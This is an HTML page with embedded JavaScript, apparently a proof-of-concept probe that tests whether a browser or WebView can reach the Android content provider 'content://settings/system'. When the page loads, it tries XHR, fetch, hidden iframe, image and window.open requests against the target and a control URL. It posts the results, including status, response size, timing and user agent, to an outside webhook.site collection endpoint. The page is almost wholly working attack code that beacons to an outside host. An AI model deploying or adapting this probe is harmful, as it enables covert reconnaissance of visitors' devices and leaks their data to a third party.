<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Advanced content:// Probe</title>
</head>
<body>
<h3>Advanced Probe Running...</h3>

<script>
const CONFIG = {
    TARGET: "content://settings/system",
    CONTROL: "https://example.com/",
    WEBHOOK: "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d"
};

function report(data) {
    fetch(CONFIG.WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            time: Date.now(),
            ua: navigator.userAgent,
            ...data
        })
    });
}

// ========== XHR ==========
function testXHR(url, label) {
    const start = performance.now();
    const xhr = new XMLHttpRequest();

    xhr.open("GET", url, true);
    xhr.responseType = "blob";

    xhr.onloadend = function() {
        report({
            type: "XHR",
            label,
            url,
            status: xhr.status,
            duration: performance.now() - start,
            size: xhr.response ? xhr.response.size : 0
        });
    };

    xhr.onerror = e => report({ type: "XHR_ERROR", label, error: e.toString() });

    try { xhr.send(); }
    catch(e) { report({ type: "XHR_EXCEPTION", label, error: e.toString() }); }
}

// ========== FETCH ==========
async function testFetch(url, label) {
    const start = performance.now();
    try {
        await fetch(url, { mode: "no-cors" });
        report({
            type: "FETCH",
            label,
            duration: performance.now() - start
        });
    } catch (e) {
        report({
            type: "FETCH_ERROR",
            label,
            error: e.toString()
        });
    }
}

// ========== IFRAME ==========
function testIframe(url, label) {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";

    let loaded = false;

    iframe.onload = () => {
        loaded = true;
        report({ type: "IFRAME_LOAD", label });
    };

    iframe.onerror = () => report({ type: "IFRAME_ERROR", label });

    setTimeout(() => {
        if (!loaded) report({ type: "IFRAME_TIMEOUT", label });
    }, 3000);

    iframe.src = url;
    document.body.appendChild(iframe);
}

// ========== IMAGE ==========
function testImage(url, label) {
    const img = new Image();

    img.onload = () => report({ type: "IMG_LOAD", label });
    img.onerror = () => report({ type: "IMG_ERROR", label });

    img.src = url;
}

// ========== WINDOW ==========
function testWindow(url, label) {
    const start = performance.now();
    try {
        const w = window.open(url, "_blank");
        setTimeout(() => {
            report({
                type: "WINDOW",
                label,
                opened: !!w,
                duration: performance.now() - start
            });
        }, 1000);
    } catch (e) {
        report({
            type: "WINDOW_ERROR",
            label,
            error: e.toString()
        });
    }
}

// ========== RUN ==========
window.onload = () => {
    const tests = [
        [CONFIG.TARGET, "TARGET"],
        [CONFIG.CONTROL, "CONTROL"]
    ];

    tests.forEach(([url, label]) => {
        testXHR(url, label);
        testFetch(url, label);
        testIframe(url, label);
        testImage(url, label);
        testWindow(url, label);
    });
};
</script>

</body>
</html>
